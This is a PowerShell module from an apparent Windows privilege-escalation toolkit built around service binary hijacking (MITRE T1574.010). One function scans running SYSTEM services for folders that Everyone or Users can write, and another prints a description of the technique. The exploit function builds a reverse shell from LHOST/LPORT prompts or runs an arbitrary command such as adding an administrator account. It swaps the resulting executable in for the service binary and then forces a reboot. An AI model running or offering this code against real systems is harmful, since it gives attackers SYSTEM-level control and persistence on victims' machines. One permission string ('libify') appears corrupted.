

function WFL-check-T1574.010 {

        $FolderName = ".\lib\tmp\"
             if (Test-Path $FolderName) {
             }
             else
             {

        #Create TMP directory if not exists
        New-Item $FolderName -ItemType Directory

               }

    Get-WmiObject win32_service | ? { $_.StartName -eq 'LocalSystem' } | ? { $_.State -eq 'Running' } | Select-Object PathName | Out-File -FilePath .\lib\tmp\00001.winfl
    $file = ".\lib\tmp\00001.winfl"
            (gc $file | Select-Object -Skip 3) | sc $file
            ((Get-Content -path .\lib\tmp\00001.winfl -Raw) -replace '"', '') | Set-Content -Path .\lib\tmp\00002.winfl
    $s = (Get-Content -path .\lib\tmp\00002.winfl -Raw)
    $s -replace "(?<=\.exe).*" | Out-File -FilePath .\lib\tmp\00003.winfl
    Get-Content .\lib\tmp\00003.winfl | select-string -pattern 'svchost.exe' -notmatch | Out-File .\lib\tmp\00004.winfl
    Get-Content .\lib\tmp\00004.winfl | select-string -pattern 'lsass.exe' -notmatch | Out-File .\lib\tmp\00005.winfl
    Get-Content .\lib\tmp\00005.winfl | select-string -pattern 'spoolsv.exe' -notmatch | Out-File .\lib\tmp\00006.winfl
    Get-Content .\lib\tmp\00006.winfl | select-string -pattern 'SearchIndexer.exe' -notmatch | Out-File .\lib\tmp\00007.winfl
            (gc .\lib\tmp\00007.winfl) | ? { $_.trim() -ne "" } | set-content .\lib\tmp\00008.winfl
    $end = ".\lib\tmp\00008.winfl"
    $hash = @{}      # define a new empty hash table
    gc $end | % { if ($hash.$_ -eq $null) { $_ }; $hash.$_ = 1 } > .\lib\tmp\00009.winfl

    Write-Host

    foreach ($line in Get-Content .\lib\tmp\00009.winfl) {
        if (
            Get-ChildItem $line  -Directory | Get-Acl | select -ExpandProperty access |` select IdentityReference, FileSystemRights | Where-Object { ($_.IdentityReference -eq 'Everyone' -and $_.FileSystemRights -eq 'FullControl'  ) -or ($_.IdentityReference -eq 'BUILTIN\Users' -and $_.FileSystemRights -eq 'libify, Synchronize') -or ($_.IdentityReference -eq 'BUILTIN\Users' -and $_.FileSystemRights -eq 'FullControl') -or ($_.IdentityReference -eq 'BUILTIN\Users' -and $_.FileSystemRights -eq 'Write, ReadAndExecute, Synchronize') } | ft -auto 
        ) {
            "`n"
            Write-Host " [+] WARNING: this service is most likely vulnerable to insecure folder permission! " -ForegroundColor Magenta 
            "`n"
            Write-Host $line  -ForegroundColor Green 
            get-acl $line | Select-Object -ExpandProperty access |` Select-Object IdentityReference, FileSystemRights | Format-Table -auto
        }

        Else { Write-Host $line "[+] does not seem to be vulnerable" -ForegroundColor red }
    }
    Write-Host

    Remove-Item .\lib\tmp\*.winfl
    #Read-Host " [*] Press any key to continue..."      
}
             
             
function WFL-info-T1574.010 {
            
    Write-Host  
    Write-host "             Adversaries may execute their own malicious payloads
             by hijacking the binaries used by services.
             Adversaries may use flaws in the permissions
             of Windows services to replace the binary 
             that is executed upon service start.
             These service processes may automatically execute specific 
             binaries as part of their functionality or 
             to perform other actions.
             If the permissions on the file system 
             directory containing a target binary, or permissions 
             on the binary itself are improperly set,
             then the target binary may be overwritten 
             with another binary using user-level permissions 
             and executed by the original process.
             If the original process and thread are running 
             under a higher permissions level, 
             then the replaced binary will also execute under 
             higher-level permissions, which could include SYSTEM. 
             Adversaries may use this technique to replace 
             legitimate binaries with malicious ones 
             as a means of executing code
             at a higher permissions level.
             If the executing process is set to run at
             a specific time or during a certain 
             event (e.g., system bootup)
             then this technique can also be used for persistence."       
    Write-Host 
        

} function WFL-exploit-T1574.010 {
    write-host
    $exploit_service = Read-Host -Prompt '[*] Insert the path of the service you want to exploit'
    write-host
    do {
        $confirm = ""
        $confirm = Read-Host -Prompt '[*] Type "agent" if you want to create a new reverse shell or "cmd" if you want to execute a command'
        $array = "agent", "cmd"
        if ($confirm -eq 'agent') {
            Write-Host
            $ipaddress_rev = Read-Host -Prompt '[*] Insert LHOST: '
            $port_rev = Read-Host -Prompt '[*] Insert LPORT: '
         
            $original_file = '.\lib\rev.ps1'
            $destination_file = '.\lib\revshell.ps1'
                (Get-Content $original_file) | Foreach-Object {
                $_ -replace 'ipaddress_rev', $ipaddress_rev `
                    -replace 'port_rev', $port_rev `
            } | Set-Content $destination_file
          
            Invoke-Exec .\lib\revshell.ps1 .\lib\revshell.exe -noConsole -noError
            Remove-Item .\lib\revshell.ps1
            write-host
        }
        elseif ($confirm -eq 'cmd') {
            Write-Host
            $cmd = Read-Host -Prompt '[*] Insert a command that you want to execute in the victim machine (Ex.net user /add [username] [password] && net localgroup administrators [username] /add): '
                
         
            $original_file = '.\lib\cmd_master.ps1'
            $destination_file = '.\lib\cmd.ps1'
                (Get-Content $original_file) | Foreach-Object {
                $_ -replace 'command', $cmd `
            } | Set-Content $destination_file
          
            Invoke-Exec .\lib\cmd.ps1 .\lib\revshell.exe -noConsole -noError
            #Remove-Item .\revshell.ps1
            write-host
        }
    }  until ($confirm -in $array)

    
    try {
        $exploit_service_bk = "$($exploit_service)-bk"
        Rename-Item -Path $exploit_service -NewName $exploit_service_bk -Force
        Copy-Item .\lib\revshell.exe $exploit_service
        Remove-Item .\lib\revshell.exe
        write-host 
    }

    catch { 
        Write-Host "[-] Unable to rename or copy the executable. Please try again." -ForegroundColor red
        Write-Host $_
        Write-Host
        break
    }

    $confirmation = ""
    do {
        $confirmation = Read-Host "[*] To enable the agent or cmd you must restart victim pc, are you sure you want to restart the pc? (y/n)"
        if ($confirmation -eq 'y') {
            shutdown /r /t 0
        }
    } while ($confirmation -ne "n")
}


             

